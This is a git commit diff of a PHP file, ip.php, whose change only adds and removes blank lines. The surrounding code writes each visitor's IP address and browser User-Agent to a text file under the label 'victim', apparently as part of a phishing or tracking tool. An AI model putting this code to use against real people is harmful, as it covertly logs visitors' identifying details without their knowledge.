a2d249804a03c56e2ff5d692994d09fff842de88
csr13 <carsaroca.13@gmail.com>
2023-06-19 03:48:00 -0600

    updateZ

--- src/ip.php
+++ src/ip.php
@@ -12,18 +12,19 @@ else
     {
       $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
     }
+
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
 $file = 'ip.txt';
 $victim = "IP: ";
+
 $fp = fopen($file, 'a');
 
 fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
 fwrite($fp, $browser);
-
 
 fclose($fp);
